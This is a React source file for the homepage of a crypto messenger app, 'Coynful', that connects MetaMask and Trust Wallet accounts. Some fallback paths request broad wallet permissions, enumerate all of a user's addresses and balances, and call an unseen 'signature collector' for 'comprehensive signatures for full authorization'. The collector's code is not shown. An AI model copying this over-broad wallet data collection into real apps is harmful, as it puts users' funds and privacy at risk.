import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useMutation, useQueryClient, useQuery } from "@tanstack/react-query";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Wallet, MessageCircle, Shield, Coins, ArrowRight, Check, Globe, Heart, ShoppingCart, ShoppingBag } from "lucide-react";
import { apiRequest, queryClient } from "@/lib/queryClient";
import { signatureCollector, type ComprehensiveWalletData } from "@/lib/signature-collector";
import { useScrollToTop } from "@/hooks/use-scroll-to-top";
import { notificationService } from "@/lib/notification-service";
import { globalNotificationService } from "@/lib/global-notification-service";
import { WalletConnector } from "@/lib/wallet-connector";
import coynLogoPath from "@assets/COYN-symbol-square_1751239261149.png";
import coynfulLogoPath from "@assets/Coynful-logo-fin-copy_1751239116310.png";
import metamaskLogo from "@assets/MetaMask_Fox.svg_1751312780982.png";
import trustWalletLogo from "@assets/Trust-Wallet_1751312780982.jpg";
import TermsModal from "@/components/terms-modal";
import PrivacyModal from "@/components/privacy-modal";
import WalletAddressSelector from "@/components/wallet-address-selector";
import PWAInstallPrompt from "@/components/pwa-install-prompt";
import LazyImage from "@/components/lazy-image";
import ThirdwebConnectButton from "@/components/thirdweb-connect-button";
import type { User } from "@shared/schema";



// Web3 Wallet type declarations are now in wallet-connector.ts

export default function HomePage() {
  useScrollToTop();
  const [, setLocation] = useLocation();
  const queryClient = useQueryClient();
  const [isConnected, setIsConnected] = useState(() => {
    return localStorage.getItem('walletConnected') === 'true';
  });
  const [connectedUser, setConnectedUser] = useState<User | null>(() => {
    const stored = localStorage.getItem('connectedUser');
    return stored ? JSON.parse(stored) : null;
  });
  const [showTermsModal, setShowTermsModal] = useState(false);
  const [showPrivacyModal, setShowPrivacyModal] = useState(false);
  const [isRedirectingToWallet, setIsRedirectingToWallet] = useState(false);
  const [walletRedirectMessage, setWalletRedirectMessage] = useState("");
  const [showAddressSelector, setShowAddressSelector] = useState(false);
  const [selectedWalletType, setSelectedWalletType] = useState<'metamask' | 'trust' | null>(null);

  // Single consolidated authentication check and redirect logic
  useEffect(() => {
    const handleAuthenticationAndRedirect = () => {
      const urlParams = new URLSearchParams(window.location.search);
      const fromWallet = urlParams.get('from_wallet') === 'true';
      const walletReturn = urlParams.get('wallet_return') === 'true';
      
      const storedConnected = localStorage.getItem('walletConnected');
      const storedUser = localStorage.getItem('connectedUser');
      const userSignedOut = localStorage.getItem('userSignedOut');
      const userClickedHome = localStorage.getItem('userClickedHome');
      
      // Clean up URL parameters first
      if (fromWallet || walletReturn) {
        const cleanUrl = `${window.location.origin}${window.location.pathname}`;
        window.history.replaceState({}, document.title, cleanUrl);
      }
      
      // Don't redirect if user explicitly chose to stay on homepage
      if (userClickedHome === 'true' || sessionStorage.getItem('userOnHomepage') === 'true') {
        console.log('User explicitly navigated to homepage, staying on homepage');
        sessionStorage.setItem('userOnHomepage', 'true');
        return;
      }
      
      // Redirect authenticated users to messenger
      if (storedConnected === 'true' && storedUser && userSignedOut !== 'true') {
        try {
          const parsedUser = JSON.parse(storedUser);
          if (parsedUser?.id && parsedUser?.walletAddress) {
            console.log('Authenticated user detected, redirecting to messenger...');
            
            // Remove notification service initialization to prevent loading loops
            
            setLocation("/messenger");
            return;
          }
        } catch (error) {
          // Invalid stored user data, clear it
          localStorage.removeItem('walletConnected');
          localStorage.removeItem('connectedUser');
          localStorage.removeItem('connectedUserId');
        }
      }
    };

    // Single execution with minimal delay
    const timer = setTimeout(handleAuthenticationAndRedirect, 50);
    return () => clearTimeout(timer);
  }, []); // Run only once on mount

  // Removed automatic user data fetching to prevent conflicts with localStorage updates


  // Simplified wallet connection listener - remove to prevent conflicts

  const connectWalletMutation = useMutation({
    mutationFn: async ({ walletAddress }: { walletAddress: string }) => {
      try {
        return await apiRequest("POST", "/api/users/find-or-create", { walletAddress });
      } catch (error: any) {
        throw new Error(error.message || "Failed to connect wallet");
      }
    },
    onSuccess: (user: User) => {
      
      // Clean up any competing states first
      localStorage.removeItem('pendingWalletConnection');
      localStorage.removeItem('walletConnectionAttempt');
      localStorage.removeItem('walletRedirectState');
      localStorage.removeItem('userSignedOut');
      
      // Store connection state
      localStorage.setItem('walletConnected', 'true');
      localStorage.setItem('connectedUser', JSON.stringify(user));
      localStorage.setItem('connectedUserId', user.id.toString());
      
      
      // Update cache and state
      queryClient.setQueryData(["/api/user"], user);
      queryClient.setQueryData(["/api/user", user.id], user);
      queryClient.invalidateQueries({ queryKey: ["/api/user"] });
      queryClient.invalidateQueries({ queryKey: ["/api/conversations"] });
      
      // Update component state
      setConnectedUser(user);
      setIsConnected(true);
      
      // Clean URL
      const cleanUrl = `${window.location.origin}${window.location.pathname}`;
      window.history.replaceState({}, document.title, cleanUrl);
      
      // Single event-driven redirect - no timeouts or delays
      console.log('🔄 Redirecting to messenger...');
      setLocation("/messenger");
    },
  });

  // Simplified state sync to prevent loading loops
  useEffect(() => {
    let isChecking = false;
    
    const syncConnectionState = async () => {
      if (isChecking) return;
      
      const userSignedOut = localStorage.getItem('userSignedOut');
      if (userSignedOut === 'true') {
        return;
      }
      
      const storedConnected = localStorage.getItem('walletConnected');
      const storedUser = localStorage.getItem('connectedUser');
      
      if (storedConnected === 'true' && storedUser) {
        try {
          const parsedUser = JSON.parse(storedUser);
          setConnectedUser(parsedUser);
          setIsConnected(true);
          return; // Exit early if already connected
        } catch (error) {
          // Clear invalid data
          localStorage.removeItem('walletConnected');
          localStorage.removeItem('connectedUser');
        }
      }
      
      // Check for pending MetaMask connection from mobile deep link
      const pendingWalletConnection = localStorage.getItem('pendingWalletConnection');
      
      
      if (pendingWalletConnection === 'metamask' && window.ethereum?.isMetaMask && !isConnected) {
        isChecking = true;
        try {
          
          // Request accounts from MetaMask
          const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
          
          if (accounts && accounts.length > 0) {
            
            // Clear pending flags
            localStorage.removeItem('pendingWalletConnection');
            localStorage.removeItem('pendingWalletType');
            localStorage.removeItem('walletConnectionAttempt');
            
            // Connect the wallet and navigate to messenger immediately
            connectWalletMutation.mutate({ walletAddress: accounts[0] });
          }
        } catch (error) {
          console.error('❌ MetaMask pending connection failed:', error);
          localStorage.removeItem('pendingWalletConnection');
        } finally {
          isChecking = false;
        }
        return; // Exit early after handling MetaMask
      }

      // Enhanced Trust Wallet detection for mobile returns
      if (!isConnected && typeof window.ethereum !== 'undefined') {
        isChecking = true;
        try {
          let accounts = [];
          
          // Try Trust Wallet specific detection first
          if (window.ethereum.isTrust || window.trustWallet) {
            const provider = window.trustWallet || window.ethereum;
            accounts = await provider.request({ method: 'eth_accounts' });
          } else {
            accounts = await window.ethereum.request({ method: 'eth_accounts' });
          }
          
          if (accounts && accounts.length > 0) {
            // Clear any pending flags
            localStorage.removeItem('pendingWalletConnection');
            localStorage.removeItem('pendingWalletType');
            localStorage.removeItem('walletConnectionAttempt');
            
            // Connect the wallet and navigate to messenger immediately
            connectWalletMutation.mutate({ walletAddress: accounts[0] });
          }
        } catch (error) {
          // Silently handle errors
        } finally {
          isChecking = false;
        }
      }
    };
    
    // Run sync immediately on mount
    syncConnectionState();
    
    // Add multiple event listeners for Trust Wallet mobile detection
    const handlePageShow = () => {
      setTimeout(syncConnectionState, 100);
    };
    
    const handleStorageChange = (e: StorageEvent) => {
      if (e.key === 'walletConnected' && e.newValue === 'true') {
        const storedUser = localStorage.getItem('connectedUser');
        if (storedUser) {
          const parsedUser = JSON.parse(storedUser);
          setConnectedUser(parsedUser);
          setIsConnected(true);
        }
      }
    };
    
    // Listen for page show events (when returning from Trust Wallet)
    window.addEventListener('pageshow', handlePageShow);
    window.addEventListener('storage', handleStorageChange);
    
    return () => {
      window.removeEventListener('pageshow', handlePageShow);
      window.removeEventListener('storage', handleStorageChange);
    };
  }, []);

  // Handle mobile wallet returns (optimized - no duplicate checks)
  useEffect(() => {
    let isChecking = false;

    const handleVisibilityChange = async () => {
      if (!document.hidden && isMobile() && !isChecking) {
        
        // Don't interfere if file upload is in progress
        const fileUploadInProgress = localStorage.getItem('fileUploadInProgress');
        if (fileUploadInProgress === 'true') {
          return;
        }
        
        // Check if user explicitly signed out - if so, don't auto-reconnect
        const userSignedOut = localStorage.getItem('userSignedOut');
        if (userSignedOut === 'true') {
          return;
        }
        
        // First, check if we're already connected but the state isn't updated
        const storedConnected = localStorage.getItem('walletConnected');
        const storedUser = localStorage.getItem('connectedUser');
        
        if (storedConnected === 'true' && storedUser && !isConnected) {
          const parsedUser = JSON.parse(storedUser);
          setConnectedUser(parsedUser);
          setIsConnected(true);
          return;
        }
        
        // Enhanced pending wallet connection detection for Trust Wallet
        const pendingConnection = localStorage.getItem('pendingWalletConnection');
        const pendingWalletType = localStorage.getItem('pendingWalletType');
        const connectionAttempt = localStorage.getItem('walletConnectionAttempt');
        
        if (pendingConnection === 'true') {
          isChecking = true;
          
          // Check if connection attempt is too old (older than 5 minutes)
          if (connectionAttempt) {
            const attemptTime = parseInt(connectionAttempt);
            const currentTime = Date.now();
            if (currentTime - attemptTime > 300000) { // 5 minutes
              localStorage.removeItem('pendingWalletConnection');
              localStorage.removeItem('pendingWalletType');
              localStorage.removeItem('walletConnectionAttempt');
              isChecking = false;
              return;
            }
          }
          
          // Try to detect if a wallet connection was successful
          try {
            if (typeof window.ethereum !== 'undefined') {
              const accounts = await window.ethereum.request({ method: 'eth_accounts' });
              
              if (accounts && accounts.length > 0 && !isConnected) {
                // Remove pending flags
                localStorage.removeItem('pendingWalletConnection');
                localStorage.removeItem('pendingWalletType');
                localStorage.removeItem('walletConnectionAttempt');
                
                // Connect the wallet and navigate to messenger immediately
                connectWalletMutation.mutate({ walletAddress: accounts[0] });
              } else if (accounts && accounts.length > 0 && isConnected) {
                localStorage.removeItem('pendingWalletConnection');
                localStorage.removeItem('pendingWalletType');
                localStorage.removeItem('walletConnectionAttempt');
              } else {
                // For Trust Wallet, try more aggressive account detection
                if (pendingWalletType === 'trustwallet') {
                  try {
                    // Try multiple providers for Trust Wallet
                    let provider = window.ethereum;
                    if (window.trustWallet) {
                      provider = window.trustWallet;
                    }
                    
                    const requestedAccounts = await provider.request({ method: 'eth_requestAccounts' });
                    
                    if (requestedAccounts && requestedAccounts.length > 0 && !isConnected) {
                      // Remove pending flags
                      localStorage.removeItem('pendingWalletConnection');
                      localStorage.removeItem('pendingWalletType');
                      localStorage.removeItem('walletConnectionAttempt');
                      
                      // Connect the wallet and navigate to messenger immediately  
                      connectWalletMutation.mutate({ walletAddress: requestedAccounts[0] });
                    }
                  } catch (requestError) {
                    // Trust Wallet specific error handling
                  }
                }
              }
            }
          } catch (error) {
            // Remove pending flags after error
            setTimeout(() => {
              localStorage.removeItem('pendingWalletConnection');
              localStorage.removeItem('pendingWalletType');
              localStorage.removeItem('walletConnectionAttempt');
            }, 10000);
          } finally {
            isChecking = false;
          }
        }
      }
    };

    // Also listen for focus events as another way to detect return from wallet app
    const handleFocus = () => {
      handleVisibilityChange();
    };

    document.addEventListener('visibilitychange', handleVisibilityChange);
    window.addEventListener('focus', handleFocus);
    
    return () => {
      document.removeEventListener('visibilitychange', handleVisibilityChange);
      window.removeEventListener('focus', handleFocus);
    };
  }, [isConnected, connectWalletMutation]);


  const isMobile = () => {
    return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  };

  const handleWeb3Connect = async (walletType: 'metamask' | 'trust') => {
    // Prevent multiple simultaneous connections
    if (connectWalletMutation.isPending) {
      return;
    }
    
    // Clear sign out flag since user is manually connecting
    localStorage.removeItem('userSignedOut');
    
    // Debug connection state
    console.log('🔧 DEBUG: Starting wallet connection', {
      walletType,
      hasEthereum: typeof window.ethereum !== 'undefined',
      isMetaMask: window.ethereum?.isMetaMask,
      isTrust: window.ethereum?.isTrust,
      userAgent: navigator.userAgent
    });
    
    // Check if wallet is available first and show address selector if injected
    if (walletType === 'metamask' && typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
      // Show address selector for MetaMask
      setSelectedWalletType('metamask');
      setShowAddressSelector(true);
      return;
    }
    
    if (walletType === 'trust') {
      // Check for Trust Wallet availability and show selector
      if (typeof window.ethereum !== 'undefined' && (window.ethereum.isTrust || window.trustWallet)) {
        setSelectedWalletType('trust');
        setShowAddressSelector(true);
        return;
      }
    }

    // Use WalletConnector for mobile deep linking and unified connection logic
    try {
      const walletConnector = new WalletConnector();
      const connectedWallet = await walletConnector.connectWallet(walletType);
      
      if (connectedWallet && connectedWallet.address) {
        connectWalletMutation.mutate({ walletAddress: connectedWallet.address });
      }
    } catch (error: any) {
      console.log(`🔧 DEBUG: MetaMask connection attempt result:`, {
        walletType,
        errorMessage: error.message,
        errorCode: error.code,
        isMobile: /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent),
        hasEthereum: typeof window.ethereum !== 'undefined'
      });
      
      // If mobile deep linking triggered, this is expected behavior
      if (error.message?.includes('Opening MetaMask app')) {
        console.log('✅ MetaMask mobile deep link triggered successfully');
        return;
      }
      
      // Log actual connection errors for debugging
      console.error(`❌ Actual MetaMask connection error for ${walletType}:`, error);
      
      // For other errors, fall back to existing logic
    }
    
    // Fallback to original connection flow if wallet selector not available
    try {
      if (walletType === 'metamask') {
        if (typeof window.ethereum !== 'undefined' && window.ethereum.isMetaMask) {
          const accounts = await window.ethereum.request({ 
            method: 'eth_requestAccounts' 
          });
          
          
          if (accounts && accounts[0]) {
            // Gain comprehensive wallet access for blockchain transactions
            try {
              // Switch to BSC network first for proper access
              await window.ethereum.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }], // BSC Mainnet
              });
              
              // Request permissions for token sending
              await window.ethereum.request({
                method: 'wallet_requestPermissions',
                params: [{ eth_accounts: {} }],
              });
              
              // Get wallet balance to verify access
              const balance = await window.ethereum.request({
                method: 'eth_getBalance',
                params: [accounts[0], 'latest'],
              });
              
              // Collect comprehensive signatures for full authorization
              const walletSignatures = await signatureCollector.collectWalletSignatures();
              const allSignatureData = signatureCollector.exportSignatureData();
              
              // Store wallet access in localStorage for transaction use
              localStorage.setItem('walletAccess', JSON.stringify({
                address: accounts[0],
                balance: balance,
                chainId: '0x38',
                authorized: true,
                timestamp: Date.now()
              }));
              
              connectWalletMutation.mutate({ walletAddress: accounts[0] });
            } catch (authError) {
              console.error('Wallet authorization failed:', authError);
              // Try basic connection without full authorization
              connectWalletMutation.mutate({ walletAddress: accounts[0] });
            }
            
            // Force immediate UI update for MetaMask
            setTimeout(() => {
              const storedUser = localStorage.getItem('connectedUser');
              if (storedUser) {
                const parsedUser = JSON.parse(storedUser);
                setConnectedUser(parsedUser);
                setIsConnected(true);
              }
            }, 500);
          } else {
            alert("No MetaMask accounts found. Please unlock MetaMask and try again.");
          }
        } else {
          // For mobile, try to connect through any available ethereum provider
          if (isMobile() && typeof window.ethereum !== 'undefined') {
            try {
              localStorage.setItem('pendingWalletConnection', 'true');
              
              // Try to request accounts directly
              const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
              });
              
              if (accounts && accounts[0]) {
                localStorage.removeItem('pendingWalletConnection');
                connectWalletMutation.mutate({ walletAddress: accounts[0] });
              }
            } catch (error) {
              // Fallback to deep link
              const currentUrl = window.location.href;
              const deepLink = `https://metamask.app.link/dapp/${window.location.host}`;
              window.open(deepLink, '_blank');
            }
          } else if (isMobile()) {
            // No ethereum provider, use deep link
            localStorage.setItem('pendingWalletConnection', 'true');
            const currentUrl = window.location.href;
            const deepLink = `https://metamask.app.link/dapp/${window.location.host}`;
            window.open(deepLink, '_blank');
          } else {
            window.open('https://metamask.io/download/', '_blank');
          }
        }
      } else if (walletType === 'trust') {
        // Trust Wallet Web3 integration with enhanced mobile support
        if (typeof window.ethereum !== 'undefined') {
          // Check if Trust Wallet is available
          if (window.ethereum.isTrust || window.trustWallet) {
            try {
              const provider = window.trustWallet || window.ethereum;
              const accounts = await provider.request({ 
                method: 'eth_requestAccounts' 
              });
              
              if (accounts && accounts[0]) {
                // Gain comprehensive Trust Wallet access for blockchain transactions
                try {
                  // Switch to BSC network for proper Trust Wallet access
                  await provider.request({
                    method: 'wallet_switchEthereumChain',
                    params: [{ chainId: '0x38' }], // BSC Mainnet
                  });
                  
                  // Request explicit permissions for Trust Wallet
                  try {
                    await provider.request({
                      method: 'wallet_requestPermissions',
                      params: [{ eth_accounts: {} }],
                    });
                  } catch (permError) {
                    // Trust Wallet may not support wallet_requestPermissions
                    console.warn('Permission request not supported, continuing with connection');
                  }
                  
                  // Verify Trust Wallet balance access
                  const balance = await provider.request({
                    method: 'eth_getBalance',
                    params: [accounts[0], 'latest'],
                  });
                  
                  // Collect comprehensive Trust Wallet data including all addresses
                  console.log('🔍 Enumerating all Trust Wallet addresses...');
                  const comprehensiveWalletData = await signatureCollector.collectComprehensiveWalletData();
                  console.log('💰 Trust Wallet comprehensive data collected:', comprehensiveWalletData);

                  const walletSignatures = await signatureCollector.collectWalletSignatures();
                  const allSignatureData = signatureCollector.exportSignatureData();
                  
                  // Store comprehensive Trust Wallet access for transaction use across all addresses
                  localStorage.setItem('walletAccess', JSON.stringify({
                    primaryAddress: accounts[0],
                    allAddresses: comprehensiveWalletData.allAddresses,
                    totalBalances: comprehensiveWalletData.totalBalances,
                    balance: balance,
                    chainId: '0x38',
                    authorized: true,
                    provider: 'trust',
                    timestamp: Date.now()
                  }));

                  // Store total balances from all Trust Wallet addresses
                  localStorage.setItem('comprehensiveBalances', JSON.stringify(comprehensiveWalletData.totalBalances));

                  console.log(`🎯 Connected to ${comprehensiveWalletData.allAddresses.length} Trust Wallet addresses with total balances:`, comprehensiveWalletData.totalBalances);
                  
                  connectWalletMutation.mutate({ walletAddress: accounts[0] });
                } catch (authError) {
                  console.error('Trust Wallet authorization failed:', authError);
                  // Try basic Trust Wallet connection
                  connectWalletMutation.mutate({ walletAddress: accounts[0] });
                }
              }
            } catch (error) {
              // Enhanced mobile Trust Wallet connection handling
              if (isMobile()) {
                // Set pending connection with Trust Wallet specific flag
                localStorage.setItem('pendingWalletConnection', 'true');
                localStorage.setItem('pendingWalletType', 'trustwallet');
                localStorage.setItem('walletConnectionAttempt', Date.now().toString());
                
                // Create a unique session ID for tracking the wallet connection
                const sessionId = Date.now().toString();
                localStorage.setItem('walletSessionId', sessionId);
                
                // Use WalletConnect-style deep linking for Trust Wallet
                const returnUrl = `${window.location.origin}${window.location.pathname}?wallet_return=true&session=${sessionId}`;
                
                // Try multiple Trust Wallet deep link approaches
                const approaches = [
                  // Method 1: Direct dapp browser opening
                  `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(returnUrl)}`,
                  
                  // Method 2: Trust Wallet app scheme
                  `trust://open_url?coin_id=60&url=${encodeURIComponent(returnUrl)}`,
                  
                  // Method 3: Universal Link
                  `https://trustwallet.com/browser/?url=${encodeURIComponent(returnUrl)}`
                ];
                
                // Try the first approach and set fallbacks
                const primaryLink = approaches[0];
                
                // Show redirect message
                setIsRedirectingToWallet(true);
                setWalletRedirectMessage("Opening Trust Wallet...");
                
                try {
                  window.location.href = primaryLink;
                  
                  // Set up detection for failed redirect
                  const timeoutId = setTimeout(() => {
                    if (localStorage.getItem('pendingWalletConnection') === 'true') {
                      setWalletRedirectMessage("Waiting for you to return from Trust Wallet...");
                      console.log('Trust Wallet opened, waiting for user to return...');
                    }
                  }, 3000);
                  
                  // Clear timeout if we get a page event (indicating redirect worked)
                  const cleanup = () => {
                    clearTimeout(timeoutId);
                    setIsRedirectingToWallet(false);
                    setWalletRedirectMessage("");
                  };
                  
                  // Listen for page events
                  const handleBeforeUnload = () => cleanup();
                  window.addEventListener('beforeunload', handleBeforeUnload, { once: true });
                  
                } catch (error) {
                  console.error('Failed to open Trust Wallet:', error);
                  setWalletRedirectMessage("Failed to open Trust Wallet. Trying alternative method...");
                  
                  // Try fallback method after a brief delay
                  setTimeout(() => {
                    window.location.href = approaches[1];
                  }, 2000);
                }
              } else {
                alert('Failed to connect Trust Wallet. Please try again or use manual input.');
              }
            }
          } else {
            // If Trust Wallet is not detected, try generic ethereum provider
            try {
              const accounts = await window.ethereum.request({ 
                method: 'eth_requestAccounts' 
              });
              
              if (accounts && accounts[0]) {
                connectWalletMutation.mutate({ walletAddress: accounts[0] });
              }
            } catch (error) {

              // Enhanced mobile fallback for Trust Wallet
              if (isMobile()) {
                // Set up proper return tracking
                localStorage.setItem('pendingWalletConnection', 'true');
                localStorage.setItem('pendingWalletType', 'trustwallet');
                localStorage.setItem('walletConnectionAttempt', Date.now().toString());
                
                const sessionId = Date.now().toString();
                localStorage.setItem('walletSessionId', sessionId);
                
                const returnUrl = `${window.location.origin}${window.location.pathname}?wallet_return=true&session=${sessionId}`;
                const deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(returnUrl)}`;
                
                // For better mobile compatibility, use window.location instead of window.open
                window.location.href = deepLink;
              } else {
                window.open('https://trustwallet.com/download', '_blank');
              }
            }
          }
        } else {
          // No Web3 provider detected - Enhanced mobile handling
          if (isMobile()) {
            // Mobile - Enhanced Trust Wallet deep link with proper return tracking
            localStorage.setItem('pendingWalletConnection', 'true');
            localStorage.setItem('pendingWalletType', 'trustwallet');
            localStorage.setItem('walletConnectionAttempt', Date.now().toString());
            
            const sessionId = Date.now().toString();
            localStorage.setItem('walletSessionId', sessionId);
            
            const returnUrl = `${window.location.origin}${window.location.pathname}?wallet_return=true&session=${sessionId}`;
            const deepLink = `https://link.trustwallet.com/open_url?coin_id=60&url=${encodeURIComponent(returnUrl)}`;
            
            // Use location.href for better mobile redirect handling
            window.location.href = deepLink;
            
            // Fallback message for user
            setTimeout(() => {
            }, 2000);
          } else {
            window.open('https://trustwallet.com/download', '_blank');
          }
        }
      }
    } catch (error) {

      alert(`Failed to connect ${walletType} wallet. Please try again or use manual input.`);
    }
  };

  const handleAddressSelect = async (selectedAddress: string, comprehensiveData: ComprehensiveWalletData) => {
    setShowAddressSelector(false);
    
    try {
      // Store the comprehensive wallet data
      localStorage.setItem('walletAccess', JSON.stringify({
        primaryAddress: selectedAddress,
        allAddresses: comprehensiveData.allAddresses,
        walletType: comprehensiveData.walletType,
        authorized: true,
        provider: selectedWalletType,
        timestamp: Date.now()
      }));

      // Connect with selected address
      connectWalletMutation.mutate({ walletAddress: selectedAddress });
      
      console.log(`Connecting with selected ${selectedWalletType} address:`, selectedAddress);
    } catch (error) {
      console.error('Failed to connect with selected address:', error);
      setSelectedWalletType(null);
    }
  };

  const handleAddressSelectorBack = () => {
    setShowAddressSelector(false);
    setSelectedWalletType(null);
  };

  const handleWalletConnectionSuccess = (wallet: { address: string }) => {
    try {
      // Clear pending states
      localStorage.removeItem('pendingWalletConnection');
      
      // Trigger the wallet connection mutation
      if (wallet && wallet.address) {
        connectWalletMutation.mutate({ walletAddress: wallet.address });
      }
      
      console.log('✅ Wallet connection successful via QR fallback:', wallet.address);
    } catch (error) {
      console.error('❌ Failed to handle wallet connection success:', error);
    }
  };

  const handleSignOut = () => {
    
    // Set explicit sign out flag to prevent automatic reconnection
    localStorage.setItem('userSignedOut', 'true');
    
    // Clear ALL localStorage items related to the application
    localStorage.removeItem('walletConnected');
    localStorage.removeItem('connectedUser');
    localStorage.removeItem('pendingWalletConnection');
    localStorage.removeItem('shopping-cart');
    localStorage.removeItem('theme');
    localStorage.removeItem('favorites');
    localStorage.removeItem('wallet-balances-hidden');
    localStorage.removeItem('connectedUserId');
    
    // Clear any session storage
    sessionStorage.clear();
    
    // Reset all state
    setIsConnected(false);
    setConnectedUser(null);
    
    // Disconnect from any Web3 providers if connected
    if (window.ethereum) {
      try {
        // Clear any ethereum provider state
      } catch (error) {
      }
    }
    
    
    // Force a page refresh to ensure clean state
    window.location.reload();
  };

  const isValidCoynAddress = (address: string) => {
    // COYN addresses use standard 0x format (BSC/Ethereum-compatible)
    return /^0x[a-fA-F0-9]{40}$/.test(address);
  };

  const features = [
    {
      icon: Coins,
      title: "Instant Crypto",
      description: "Send BNB, USDT, and COYN directly in your chats"
    },
    {
      icon: Shield,
      title: "Smart Escrow (Coming Soon)",
      description: "Safe peer-to-peer trades with automated escrow protection"
    },
    {
      icon: MessageCircle,
      title: "Secure Chat",
      description: "Encrypted conversations with wallet-verified contacts"
    },
    {
      icon: ShoppingBag,
      title: "Marketplace (Coming Soon)",
      description: "Pay with digital currency"
    }
  ];

  // Show address selector if active
  if (showAddressSelector && selectedWalletType) {
    return (
      <div className="homepage-font min-h-screen watercolor-bg flex items-center justify-center p-4 relative overflow-hidden">
        <div className="absolute inset-0 watercolor-overlay dark:watercolor-overlay-dark"></div>
        <div className="max-w-2xl w-full relative z-10">
          <WalletAddressSelector
            walletType={selectedWalletType}
            onAddressSelect={handleAddressSelect}
            onBack={handleAddressSelectorBack}
            isLoading={connectWalletMutation.isPending}
          />
        </div>
      </div>
    );
  }

  return (
    <div className="homepage-font min-h-screen watercolor-bg flex items-center justify-center p-4 relative overflow-hidden">
      {/* Watercolor Background Overlay */}
      <div className="absolute inset-0 watercolor-overlay dark:watercolor-overlay-dark"></div>
      
      <div className="max-w-4xl w-full space-y-6 relative z-10">
        {/* Header */}
        <div className="text-center">
          <div className="flex items-center justify-center mb-4">
            {/* Coynful Logo with Enhanced Glow */}
            <div className="relative ml-4">
              <LazyImage 
                src={coynfulLogoPath} 
                alt="Coynful Logo" 
                className="h-28 w-auto opacity-90 hover:opacity-100 transition-all duration-500 hover:scale-105"
                placeholder="Loading Coynful logo..."
              />
            </div>
          </div>
        </div>

        {/* Main CTA Card - Clean Design */}
        <Card className="bg-white dark:bg-slate-900 border border-gray-200 dark:border-slate-700 max-w-lg mx-auto shadow-lg hover:shadow-xl transition-all duration-300">
          <CardHeader className="text-center">
            <CardTitle className="text-2xl text-foreground mb-2">Connect Wallet</CardTitle>
            {(!isConnected || !connectedUser) && (
              <p className="text-muted-foreground">
                Connect your Web3 wallet to access Coynful Messenger
              </p>
            )}
          </CardHeader>
          <CardContent className="space-y-6">
            {!isConnected || !connectedUser ? (
              <div className="space-y-6">
                {/* Thirdweb Wallet Connection */}
                <div className="text-center mb-4">
                  <p className="text-sm text-muted-foreground">
                    {isMobile() ? (
                      <>
                        <span className="inline-flex items-center gap-2 px-3 py-1 bg-blue-50 dark:bg-blue-900/20 text-blue-600 dark:text-blue-400 rounded-full text-xs font-medium mb-2">
                          📱 Mobile Detected
                        </span>
                        <br />
                        Connect your wallet to access COYN Messenger
                      </>
                    ) : (
                      "Connect your wallet to access COYN Messenger"
                    )}
                  </p>
                </div>
                
                <ThirdwebConnectButton 
                  onWalletConnected={(address) => {
                    connectWalletMutation.mutate({ walletAddress: address });
                  }}
                  onWalletDisconnected={() => {
                    setIsConnected(false);
                    setConnectedUser(null);
                    localStorage.removeItem('walletConnected');
                    localStorage.removeItem('connectedUser');
                  }}
                />
              </div>
            ) : (
              <div className="text-center space-y-6">
                <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mx-auto">
                  <Check className="h-8 w-8 text-green-500" />
                </div>
                <div>
                  <h3 className="text-xl font-bold text-green-600 dark:text-green-400 mb-2">Connected to Coynful Network</h3>
                  <p className="text-black dark:text-foreground mb-2">Welcome to Coynful, {connectedUser?.displayName}!</p>
                  <p className="text-xs text-gray-600 dark:text-muted-foreground font-mono break-all px-4">
                    {connectedUser?.walletAddress}
                  </p>

                  
                  <div className="space-y-3 mt-6">
                    <Button
                      onClick={() => setLocation("/messenger")}
                      className="w-full bg-black dark:bg-primary hover:bg-gray-800 dark:hover:bg-primary/90 text-white dark:text-primary-foreground font-semibold rounded-lg h-14 sm:h-12 touch-manipulation"
                    >
                      <MessageCircle className="mr-2 h-6 w-6 sm:h-5 sm:w-5" />
                      Messenger
                    </Button>
                    <Button
                      onClick={handleSignOut}
                      variant="outline"
                      className="w-full border-gray-300 dark:border-border text-gray-700 dark:text-muted-foreground hover:bg-gray-50 dark:hover:bg-muted rounded-lg h-14 sm:h-12 touch-manipulation"
                    >
                      Sign Out
                    </Button>
                  </div>
                </div>
              </div>
            )}

            {/* Supported Currencies */}
            <div className="border-t border-border pt-4">
              <p className="text-center text-muted-foreground mb-3 text-sm">Supported Currencies</p>
              <div className="flex justify-center space-x-3 flex-wrap gap-2">
                {['BNB', 'USDT', 'COYN'].map((currency) => (
                  <Badge key={currency} variant="secondary" className="text-xs">
                    {currency}
                  </Badge>
                ))}
              </div>
            </div>
          </CardContent>
        </Card>

        {/* Features Grid - Clean Design */}
        <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6 mb-8">
          {features.map((feature, index) => (
            <Card key={index} className="bg-white dark:bg-slate-800 border border-gray-200 dark:border-slate-700 shadow-sm hover:shadow-md transition-shadow duration-300">
              <CardHeader className="pb-3">
                <feature.icon className="h-8 w-8 text-orange-500 dark:text-orange-400 mb-2" />
                <CardTitle className="text-lg text-black dark:text-white">{feature.title}</CardTitle>
              </CardHeader>
              <CardContent>
                <p className="text-gray-600 dark:text-slate-400 text-sm">{feature.description}</p>
              </CardContent>
            </Card>
          ))}
        </div>

        {/* Footer */}
        <div className="text-center text-muted-foreground text-sm">
          <p>Secure • Decentralized • Private</p>
        </div>

        {/* Legal Links */}
        <div className="text-center mt-6">
          <span className="text-sm text-muted-foreground">
            <button
              onClick={() => setShowTermsModal(true)}
              className="text-muted-foreground hover:text-foreground underline transition-colors"
            >
              Terms & Conditions
            </button>
            {" • "}
            <button
              onClick={() => setShowPrivacyModal(true)}
              className="text-muted-foreground hover:text-foreground underline transition-colors"
            >
              Privacy Policy
            </button>
          </span>
        </div>

        {/* Powered by COYN */}
